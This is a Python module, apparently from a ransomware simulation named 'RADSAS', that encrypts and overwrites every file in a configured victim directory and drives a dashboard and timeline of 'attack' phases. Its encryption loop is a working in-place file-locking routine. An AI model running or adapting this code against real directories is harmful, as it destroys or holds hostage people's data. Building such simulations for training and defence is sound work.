import os
import time

from cryptography.fernet import Fernet

from config import SECRET_KEY_FILE, VICTIM_DIR
from utils.audit_logger import add_log
from services.persistence import (
    load_dashboard_state,
    save_dashboard_state
)
from services.timeline_engine import add_timeline_event


# =========================================================
# ENCRYPTION MARKER
# =========================================================

MARKER = b'RADSAS_ENCRYPTED::'


# =========================================================
# LOAD SECRET KEY
# =========================================================

def load_key():

    with open(SECRET_KEY_FILE, 'rb') as f:
        return f.read()


# =========================================================
# CHECK IF FILE IS ALREADY ENCRYPTED
# =========================================================

def is_encrypted(data):

    return data.startswith(MARKER)


# =========================================================
# ENCRYPT SINGLE FILE
# =========================================================

def encrypt_file(path):

    try:

        cipher = Fernet(load_key())

        with open(path, 'rb') as f:
            data = f.read()

        # -----------------------------------------
        # PREVENT DOUBLE ENCRYPTION
        # -----------------------------------------

        if is_encrypted(data):

            add_log(
                'WARNING',
                f'Skipped already encrypted file: {os.path.basename(path)}'
            )

            return False

        # -----------------------------------------
        # ENCRYPT FILE
        # -----------------------------------------

        encrypted_data = cipher.encrypt(data)

        # -----------------------------------------
        # ADD CUSTOM MARKER
        # -----------------------------------------

        final_data = MARKER + encrypted_data

        # -----------------------------------------
        # WRITE ENCRYPTED CONTENT
        # -----------------------------------------

        with open(path, 'wb') as f:
            f.write(final_data)

        # -----------------------------------------
        # LOGGING
        # -----------------------------------------

        add_log(
            'CRITICAL',
            f'Encrypted: {os.path.basename(path)}'
        )

        add_timeline_event(
            f'{os.path.basename(path)} encrypted'
        )

        return True

    # =====================================================
    # KEY FILE MISSING
    # =====================================================

    except FileNotFoundError:

        add_log(
            'ERROR',
            f'Key file not found. Cannot encrypt {os.path.basename(path)}'
        )

        return False

    # =====================================================
    # GENERAL ERROR
    # =====================================================

    except Exception as e:

        add_log(
            'ERROR',
            f'Encryption failed ({os.path.basename(path)}): {str(e)}'
        )

        return False


# =========================================================
# START FULL ENCRYPTION
# =========================================================

def start_encryption():

    count = 0

    files = []

    try:

        files = [

            f for f in sorted(os.listdir(VICTIM_DIR))

            if os.path.isfile(
                os.path.normpath(
                    os.path.join(VICTIM_DIR, f)
                )
            )

        ]

    except Exception as e:

        add_log(
            'ERROR',
            f'Cannot read victim directory: {e}'
        )

        return

    total = len(files)

    # =====================================================
    # LOOP THROUGH FILES
    # =====================================================

    for fname in files:

        path = os.path.normpath(
            os.path.join(VICTIM_DIR, fname)
        )

        if not os.path.isfile(path):
            continue

        # -------------------------------------------------
        # ENCRYPT
        # -------------------------------------------------

        if encrypt_file(path):

            count += 1

            # ---------------------------------------------
            # LIVE ENCRYPTION SPEED
            # ---------------------------------------------

            speed = round(count * 2.5, 1)

            state = load_dashboard_state()

            state['encryption_speed'] = speed

            save_dashboard_state(state)

        time.sleep(0.4)

    # =====================================================
    # FINAL DASHBOARD STATE
    # =====================================================

    state = load_dashboard_state()

    state['status'] = 'COMPROMISED'

    state['phase'] = 'COMPLETE'

    state['encryption_speed'] = 0

    state['attack_running'] = False

    save_dashboard_state(state)

    # =====================================================
    # FINAL LOGS
    # =====================================================

    add_log(
        'CRITICAL',
        f'Encryption complete — {count}/{total} files encrypted.'
    )

    # =====================================================
    # TIMELINE EVENTS
    # =====================================================

    add_timeline_event('Attack initialized')
    time.sleep(0.5)

    add_timeline_event('Reconnaissance phase started')
    time.sleep(0.5)

    add_timeline_event('Victim files discovered')
    time.sleep(0.5)

    add_timeline_event('Encryption engine initialized')
    time.sleep(0.5)

    add_timeline_event('Encryption process started')
    time.sleep(0.5)

    add_timeline_event(f'{count} files encrypted successfully')
    time.sleep(0.5)

    add_timeline_event('System integrity compromised')
    time.sleep(0.5)

    add_timeline_event('Attack sequence completed')
